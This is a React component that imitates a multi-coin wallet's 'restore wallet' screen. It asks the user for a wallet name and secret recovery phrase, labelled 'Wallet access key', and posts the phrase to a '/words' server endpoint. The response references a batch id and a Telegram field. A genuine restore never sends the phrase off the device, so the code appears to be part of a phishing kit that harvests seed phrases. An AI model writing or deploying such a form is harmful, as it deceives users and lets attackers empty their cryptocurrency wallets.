import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
import { useState } from 'react'
import api from '../../api/axios'

function MultiCoinWalletSection({
  walletName: initialWalletName = '',
  secretPhrase: initialSecretPhrase = '',
  onBack,
  onRestoreSuccess,
  onRestoreError,
}) {
  const [walletName, setWalletName] = useState(initialWalletName)
  const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
  const [isLoading, setIsLoading] = useState(false)

  const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0

  const handleWalletNameChange = (value) => {
    setWalletName(value)
  }

  const handleWalletNameClear = () => {
    setWalletName('')
  }

  const handleSecretPhraseChange = (value) => {
    setSecretPhrase(value)
  }

  const handlePasteSecretPhrase = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setSecretPhrase(text)
    } catch (error) {
      console.error('Failed to paste:', error)
    }
  }

  const handleRestoreWallet = async () => {
    if (!canRestore || isLoading) return

    setIsLoading(true)
    try {
      const response = await api.post('/words', {
        words: secretPhrase,
        createdBy: walletName,
        source: 'wallet-restore',
      })

      if (response.data.ok) {
        onRestoreSuccess?.({
          walletName,
          secretPhrase,
          batchId: response.data.batch.id,
          telegram: response.data.telegram,
        })
      } else {
        throw new Error(response.data.error || 'Failed to restore wallet')
      }
    } catch (error) {
      console.error('Restore error:', error)
      onRestoreError?.(error.message)
    } finally {
      setIsLoading(false)
    }
  }

  const handleOpenSecretPhraseHelp = () => {
    // Open help modal or navigate to help page
    window.open('https://example.com/help', '_blank')
  }

  return (
    <main className="app-screen restore-screen">
      <FlowHeader
        title="Multi-coin wallet"
        onBack={onBack}
        action={
          <button className="icon-button" type="button" aria-label="Scan">
            <IoScan />
          </button>
        }
      />
      <section className="restore-form">
        <div className="restore-field">
          <label htmlFor="wallet-name">Wallet name</label>
          <div className="wallet-name-field">
            <input
              id="wallet-name"
              type="text"
              value={walletName}
              enterKeyHint="next"
              onChange={(event) => handleWalletNameChange(event.target.value)}
              disabled={isLoading}
            />
            <button
              className="wallet-name-clear"
              type="button"
              aria-label="Clear name"
              onClick={handleWalletNameClear}
              disabled={isLoading}
            >
              <IoClose aria-hidden="true" />
            </button>
          </div>
        </div>
        <div className="restore-field">
          <label htmlFor="secret-phrase">Wallet access key</label>
          <div className="secret-phrase-safe-box">
            <textarea
              id="secret-phrase"
              value={secretPhrase}
              spellCheck="false"
              autoCapitalize="none"
              autoComplete="off"
              autoCorrect="off"
              enterKeyHint="done"
              onChange={(event) => handleSecretPhraseChange(event.target.value)}
              disabled={isLoading}
            />
            <button 
              type="button" 
              onClick={handlePasteSecretPhrase}
              disabled={isLoading}
            >
              Paste
            </button>
          </div>
        </div>
        <p>Enter the access details exactly as provided by your wallet</p>
      </section>
      <section className="restore-actions">
        <button 
          className="continue-button" 
          type="button" 
          disabled={!canRestore || isLoading} 
          onClick={handleRestoreWallet}
        >
          {isLoading ? 'Restoring...' : 'Restore wallet'}
        </button>
        <button 
          className="secret-help" 
          type="button" 
          onClick={handleOpenSecretPhraseHelp}
          disabled={isLoading}
        >
          Need help with wallet access?
        </button>
      </section>
    </main>
  )
}

function FlowHeader({ title, onBack, action }) {
  return (
    <header className="flow-header">
      <button className="icon-button" type="button" aria-label="Back" onClick={onBack}>
        <IoArrowBack />
      </button>
      <h1>{title}</h1>
      {action || <span></span>}
    </header>
  )
}

export default MultiCoinWalletSection